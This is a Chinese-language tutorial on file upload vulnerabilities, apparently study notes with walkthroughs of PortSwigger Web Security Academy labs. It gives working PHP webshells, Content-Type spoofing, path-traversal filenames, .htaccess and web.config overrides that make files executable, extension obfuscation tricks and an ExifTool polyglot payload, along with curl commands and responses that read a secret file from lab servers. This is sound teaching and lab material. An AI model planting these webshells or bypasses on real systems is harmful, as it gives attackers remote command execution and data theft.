# 文件上传

文件上传漏洞是指当网络服务器允许用户向其文件系统上传文件时，未对文件名、类型、内容或大小等属性进行充分验证的情况。

若未能正确实施对这些属性的限制，即使是最基础的图片上传功能，也可能被用于上传任意且潜在危险的文件。

这类文件甚至可能包含可实现远程代码执行的服务器端脚本文件。



文件上传漏洞的影响通常取决于两个关键因素：

- 网站未能正确验证文件的哪个方面，例如其大小、类型、内容等。 
- 文件成功上传后对其施加了哪些限制。



最坏的情况下，文件的类型未被正确验证，且服务器配置允许执行某些类型的文件（如 .php 和 .jsp）。在这种情况下，攻击者可能会上传一个可作为代码执行的服务器端代码文件，该文件实际上会充当网页后门，从而获得对服务器的完全控制权。

若未对文件名进行正确验证，攻击者仅需上传同名文件即可覆盖关键文件。若服务器同时存在目录遍历漏洞，攻击者甚至能将文件上传至预期外的位置。



## 文件处理

传统网站几乎完全由静态文件构成，这些文件在用户请求时直接提供服务。因此，每个请求路径都能与服务器文件系统的目录结构形成一一映射关系。随着Web技术发展，现代网站动态化程度显著提高，请求路径与文件系统的直接关联性已大幅弱化。尽管如此，服务器仍需处理样式表、图像等静态文件的请求。



服务器在解析请求路径时，会识别文件扩展名，并与预配置的扩展名/MIME类型映射表进行比对，从而确定所请求文件的类型。后续操作取决于文件类型及服务器配置：

1. **不可执行文件类型**（如图像或静态HTML页面）：服务器**通常直接将文件内容**通过HTTP响应**发送至客户端**。

2. **可执行文件类型**（如PHP文件）且服务器已配置执行权限：服务器会根据HTTP请求的标头和参数设置相关变量，随后执行脚本，最终将生成的结果通过HTTP响应发送给客户端。

3. **可执行文件类型但未配置执行权限**：服务器一般返回错误信息。但在某些配置不当的情况下，文件内容可能仍会以纯文本形式发送至客户端。此类错误配置可能引发源代码泄漏等敏感信息泄露风险，具体示例可参考我们的信息泄露学习材料。

通过观察`Content-Type`响应头，可推测服务器对返回文件类型的判断。若该标头未被应用程序代码显式设置，其值通常来自扩展名/MIME类型的映射结果。



## webshell

Web Shell是一种恶意脚本，攻击者只需向特定端点发送HTTP请求，即可在远程Web服务器上执行任意命令。



从安全角度来看，最危险的情形莫过于网站允许上传服务器端脚本（如PHP、Java或Python文件），且配置为可执行这些代码。这使得攻击者可以轻而易举地在服务器上创建自己的Web Shell。



若成功上传Web Shell，攻击者实质上就获得了服务器的完全控制权。这意味着可以任意读写文件、窃取敏感数据，甚至以该服务器为跳板攻击内部基础设施或外部网络中的其他服务器。例如，以下PHP单行代码可用于读取服务器文件系统中的任意文件：

```
<?php echo file_get_contents('/path/to/target/file'); ?>
```

上传该文件后，只需请求这个恶意文件，目标文件内容就会在响应中返回。



一个更通用的 Web Shell 可能看起来像这样：

```
<?php system($_GET['command']); ?>
```

```
<?php eval($_POST['command']); ?>
```



此脚本允许您通过查询参数传递任意系统命令，如下所示：

```
curl -i http://exp.com/example/exploit.php?command=id 
```

```
curl -i http://exp.com/example/exploit.php -X POST -d "name1=value1"
```



## Content-Type

提交 HTML 表单时，浏览器通常以 `POST` 请求发送提供的数据，内容类型为 `application/x-www-form-url-encoded` 。

这对于发送简单的文本，如您的姓名或地址，是可行的。然而，这不适用于发送大量二进制数据，例如整个图像文件或 PDF 文档。在这种情况下，建议使用内容类型 `multipart/form-data` 。



一个包含上传图片字段、提供图片描述以及输入用户名的表单。提交此类表单可能会导致如下请求：

```
POST /images HTTP/1.1
    Host: normal-website.com
    Content-Length: 12345
    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="image"; filename="example.jpg"
    Content-Type: image/jpeg

    [...binary content of example.jpg...]

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="description"

    This is an interesting description of my image.

    ---------------------------012345678901234567890123456
    Content-Disposition: form-data; name="username"

    wiener
    ---------------------------012345678901234567890123456--
```

每个部分包含一个 `Content-Disposition` 头，它提供了有关相关输入字段的一些基本信息。这些单独的部分也可能包含它们自己的 `Content-Type` 头，它告诉服务器使用此输入提交的数据的 MIME 类型。



网站可能尝试通过检查此输入特定的 `Content-Type` 头是否与预期的 MIME 类型匹配来验证文件上传。

网站验证文件上传的一种常见方法，是检查请求头中特定输入字段的Content-Type标头是否符合预期的MIME类型。例如，若服务器仅允许上传图像文件，可能只会接受 `image/jpeg` 和 `image/png` 类型。



用户在浏览器上传头像，使用 BurpSuite 工具拦截，文件字段内容如下：

```
------WebKitFormBoundaryvqUOXcGVDjOA4AqO
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['command']); ?>
```



Content-Type 为：application/octet-stream，如果直接进行提交，服务端返回内容如下：

```
Sorry, file type application/octet-stream is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.
```



在 BurpSuite 将 Content-Type 字段内容修改成 image/png，然后重新提交，上传成功。

```
------WebKitFormBoundaryvqUOXcGVDjOA4AqO
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php system($_GET['command']); ?>
```

```
The file avatars/shell.php has been uploaded
```



通过后门获取 /home/carlos/secret 文件内容。

```
curl -i https://0a93000f037d9bf3df7a47c000eb00f7.web-security-academy.net/files/avatars/shell.php?command=cat%20/home/carlos/secret
```



```
HTTP/1.1 200 OK
Date: Sun, 09 Mar 2025 02:28:35 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=iAT9hO4cOeuOPnvLyeOTZxJjmCoDzwA2; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 32

QZn57J3skYw02ANS7qenAlB1k008Wk6g
```



## 目录穿越

为了防止攻击者上传恶意文件后执行，部分应用程序会将存放用户上传文件的目录设置为不可执行。访问该类型应用程序特定路径中的 .php , .jsp 等后缀的文件，不会将文件中的代码解释执行。服务器可能会返回某种错误信息，或在某些情况下，仅以纯文本形式返回文件内容：

```
GET /static/exploit.php?command=id HTTP/1.1
    Host: normal-website.com


    HTTP/1.1 200 OK
    Content-Type: text/plain
    Content-Length: 39

    <?php echo system($_GET['command']); ?>
```



部分应用程序可能会不检查上传文件的位置，此时攻击者可以通过进行构造的文件名（例如使用 `../` 等目录穿越方法），将文件上传到其他文件夹中。



使用 BurpSuite 拦截文件上传的 HTTP 请求，HTTP 请求如下。

```
------WebKitFormBoundaryZBZmSwqqBtIuAXZM
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_GET['command']); ?>
```



将 HTTP 请求中的 filename 修改成 `%2E%2E%2Ftest%2Ephp`（URL 编码），此时文件不会上传到 **/files/avatars/**，而是 **/files/** 路径，以下是修改后的 HTTP 请求。

```
------WebKitFormBoundaryZBZmSwqqBtIuAXZM
Content-Disposition: form-data; name="avatar"; filename="%2E%2E%2Fshell%2Ephp"
Content-Type: application/octet-stream

<?php system($_GET['command']); ?>
```



读取 /home/carlos/secret 文件内容。

```
curl -i https://0a68009704c9d467846df13a00650067.web-security-academy.net/files/shell.php?command=cat%20/home/carlos/secret
```

```
HTTP/1.1 200 OK
Date: Sun, 09 Mar 2025 03:09:36 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=BuFaow1I3O6u28n5Gnlnut7lJ6X9KDmF; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 32

9VWhFOyBfawx8yINpEa1Mp6IGYPW6fYj
```



## 弱黑名单

防范用户上传恶意脚本最直观的方式之一是对 `.php` 等潜在危险文件扩展名实施黑名单拦截。然而这种黑名单机制存在根本性缺陷，因为要穷尽所有可能用于执行代码的文件扩展名几乎不可能实现。攻击者有时可以通过使用鲜为人知的替代文件扩展名（如 `.php5`、`.shtml`等）绕过此类防御，这些扩展名仍可能被服务器解析执行。



## 覆盖配置文件

正如我们在前文讨论的，服务器通常不会执行未经配置的文件。例如，在Apache服务器执行客户端请求的PHP文件之前，开发人员可能需要在 **/etc/apache2/apache2.conf** 配置文件中添加如下指令：

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```



许多服务器还允许开发者在特定目录中创建特殊配置文件，用以覆盖全局设置或进行补充配置。以Apache服务器为例，当目录中存在名为.htaccess的文件时，服务器会自动加载该文件中的目录专属配置。



开发人员可以通过 **web.config** 文件在IIS服务器上实现目录级配置。这类配置可能包含如下指令（以下示例展示了允许向用户提供JSON文件的服务配置）：

```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
</staticContent>
```



当存在 **.htaccess** 和 **web.config** 这类配置文件时，Web 服务器会使用它们进行配置，但通常情况下 HTTP 请求并不能直接访问这些配置文件。

不过在实践中，我们偶尔会发现某些服务器未能有效阻止，用户上传自定义的恶意配置文件，覆盖服务器原有的配置文件。

此时，即使所需文件扩展名已被列入黑名单，攻击者仍可通过欺骗服务器，将任意自定义文件扩展名，映射到可执行的 MIME 类型来实现攻击目的。

```
<staticContent>
    <!-- web.config 将任意文件扩展名关联到可执行类型 -->
    <mimeMap fileExtension=".hacker" mimeType="application/x-httpd-php" />
</staticContent>
```



上传一个 shell.png 图片到远程服务器，文件内容为 webshell，然后再上传一个 .htaccess 文件到远程服务器，使服务器将 png 文件解释成 php 的 MIME，此时服务器会将 xxx.png 文件当成 php 文件进行解释和执行。.htaccess 文件内容如下：

```
<FilesMatch "\.png$">
    SetHandler application/x-httpd-php
</FilesMatch>
```



通过 shell.png 执行命令读取文件内容。

```
curl -i https://0a6e00aa04aa7a8284b8332900f500ff.web-security-academy.net/files/avatars/shell.png?command=cat%20/home/carlos/secret
```

```
HTTP/1.1 200 OK
Date: Sun, 09 Mar 2025 05:06:36 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=eMyDKgF4vMn9AwEzMXoIMphkiMeIz5b1; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 32

QmfbbZMAin5CxNrATz4NNhNYPfTXYu2E
```



## 文件名混淆

即便是最详尽的黑名单也可能会被经典的混淆技术突破。假设验证代码存在大小写敏感缺陷，无法识别`exploit.pHp`实质上仍为`.php`文件。若后续映射文件扩展名到MIME类型的代码**不具备**大小写敏感性，这个校验差异将使恶意PHP文件绕过验证并最终在服务端执行。



您还可以通过以下技术实现类似效果：

- **多扩展名混淆**：根据文件名解析算法的差异，`exploit.php.jpg`既可能被识别为PHP文件也可能被识别为JPG图片
- **尾部特殊字符附加**：部分系统会自动移除或忽略尾部空格/点号等字符，例如：`exploit.php.`
- **字符URL编码（或双重编码）**：若验证时未对点号、正斜杠等进行解码，但服务端处理时却执行解码操作，即可绕过拦截上传恶意文件，例如：`exploit%2Ephp`
- **干扰符前缀注入**：在扩展名前插入分号或URL编码的空字节。当验证层使用PHP/Java等高级语言编写，而服务端使用C/C++底层函数处理时，可能引发文件名解析分歧，例如：`exploit.asp;.jpg` 或 `exploit.asp%00.jpg`
- **多字节Unicode字符伪装**：特殊Unicode序列经转换后可能生成空字节或点号。例如当系统将UTF-8编码的文件名解析后转换ASCII时，`xC0 x2E`、`xC4 xAE`或`xC0 xAE`等序列可能被转换为`x2E`



另一种防御手段是通过剥离或替换危险扩展名来阻止文件执行。若此类转换处理未采用递归校验机制，攻击者可通过巧妙排布禁用字符串的方式使处理后依然残留有效扩展名。以如下文件名进行 `.php` 删除操作为例：

```
exploit.p.phphp
```

经处理后文件名将退化为：

```
exploit.php
```

这只是众多混淆文件扩展名方法中的一小部分。



##  内容验证缺陷

相较于无条件采信 HTTP 请求头中声明的 Content-Type 值，安全性更高的服务器会主动验证上传文件的实际内容是否真正符合预期格式。

以图片上传功能为例：服务器可能会校验文件是否具备特定的内在属性（如图像分辨率等）。例如若用户试图上传 PHP 脚本文件，由于这类文件不具备任何图像解析所需的视觉维度参数，服务器可以据此推断这类文件不可能为合规图像并拒绝上传请求。



部分文件类型始终会在文件头或文件尾包含特定字节序列，这些序列如同数字指纹或签名，可用于判断文件内容是否符合预期类型。以JPEG文件为例，其始终以十六进制值FF D8 FF作为开头。

这种方式虽较文件扩展名验证更为稳健，但仍非万全之策。借助ExifTool等专业工具，攻击者可轻易在JPEG文件的元数据中嵌入恶意代码，构造出兼具合法图像外壳与隐蔽攻击载荷的特殊文件（业内称为polyglot文件）。



准备一张 png 图片，命名为 aaa.png，使用 ExifTool 工具将图片元数据信息修改为 php 的 webshell 代码。

```
exiftool.exe -Comment="<?php system($_GET['command']); ?>" aaa.png
```



输出新的文件会命名为 **aaa.png_original**，将文件名称修改为 aaa.php 并上传到网站中。

当访问 aaa.php 除了 webshell 部分得代码会被解释执行，图片的其他内容会以文本的形式输出，所以在执行命令前后使用 echo 语句，确保能识别命令输出的内容。

```
aaa1.php?command=echo "AAAAAA" ; cat /home/carlos/secret ; echo "BBBBBB"
```

```
curl -i https://0a65006703020cb3806a8a1e009a0025.web-security-academy.net/files/avatars/aaa1.php?command=echo%20%22AAAAA%22%20;%20cat%20/home/carlos/secret%20;%20echo%20%22BBBBBB%22
```

```
HTTP/1.1 200 OK
Date: Sun, 09 Mar 2025 08:20:52 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Set-Cookie: session=qpBipMgEGdJQhNcb54Pe41kZaftv0efL; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 460264

...
AAAAA pHwQ3suPg6NBdMSyCsRLSGKlnkjXBoOFBBBBBB
...
```



文件 **/home/carlos/secret** 内容为：**pHwQ3suPg6NBdMSyCsRLSGKlnkjXBoOF**
